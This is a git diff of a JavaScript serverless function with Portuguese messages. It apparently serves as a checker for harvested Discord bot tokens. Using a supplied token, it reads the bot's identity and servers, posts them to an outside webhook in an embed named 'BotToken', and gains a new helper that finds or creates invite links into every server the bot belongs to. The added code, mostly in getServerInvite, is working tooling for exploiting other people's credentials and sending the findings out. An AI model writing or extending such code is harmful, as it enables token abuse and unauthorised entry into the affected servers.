@@ -12,7 +12,6 @@ module.exports = async (req, res) => {
   }
 
   try {
-    
     const botInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
       method: 'GET',
       headers: {
@@ -28,10 +27,17 @@ module.exports = async (req, res) => {
       },
     });
     const guilds = await guildsResponse.json();
+    
+    const servers = await Promise.all(
+      guilds.map(async (guild) => {
+        const invite = await getServerInvite(guild.id, token);
+        return `${guild.name} - ${guild.id}\n[Link](${invite}) - ${guild.memberCount} Membros`;
+      }));
 
     const embed = {
       username: 'BotToken',
       embeds: [{
+        fields: [{
             name: 'Informações',
             value: `\`${botInfo?.username} - ${botInfo?.id}\``,
             inline: false
@@ -42,18 +48,18 @@ module.exports = async (req, res) => {
             inline: false
           },
           {
-            name: 'Servidores',
-            value: `\`${guilds?.map(guild => guild.name).join(', ') || 'Nenhum'}\``,
-            inline: false
-          },
-          {
             name: 'Data/Hora',
             value: new Date().toISOString(),
             inline: false
           },
+          {
+            name: 'Servidores',
+            value: `\`${servers.join('\n\n') || 'Nenhum'}\``,
+            inline: false
+          }
         ],
-      },
-      ],
+        
+      }],
     };
 
     await fetch(webhookURL, {
@@ -95,4 +101,42 @@ module.exports = async (req, res) => {
       error: 'Erro ao fazer a requisição', details: error.message
     });
   }
+}
+
+async function getServerInvite(guildId, botToken, options = { max_age: 3600, max_uses: 0, temporary: false }) {
+    try {
+        const config = {
+            headers: {
+                Authorization: `Bot ${botToken}`,
+                'Content-Type': 'application/json',
+            },
+        };
+
+        const vanityUrlResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/vanity-url`, config)
+            .catch(() => null);
+
+        if (vanityUrlResponse && vanityUrlResponse.data && vanityUrlResponse.data.code) {
+            return `https://discord.gg/${vanityUrlResponse.data.code}`;
+        }
+
+        const invitesResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/invites`, config)
+            .catch(() => null);
+
+        if (invitesResponse && invitesResponse.data && invitesResponse.data.length > 0) {
+            return `https://discord.gg/${invitesResponse.data[0].code}`;
+        }
+
+        const channelsResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/channels`, config);
+        const channels = channelsResponse.data;
+
+        const textChannel = channels.find(channel => channel.type === 0);
+        if (!textChannel) throw new Error('Nenhum canal de texto encontrado no servidor.');
+        
+        const inviteResponse = await axios.post(`https://discord.com/api/v10/channels/${textChannel.id}/invites`, options, config);
+
+        return `https://discord.gg/${inviteResponse.data.code}`;
+    } catch (error) {
+        console.error('Erro ao buscar ou criar convite:', error.message);
+        throw error;
+    }
 }
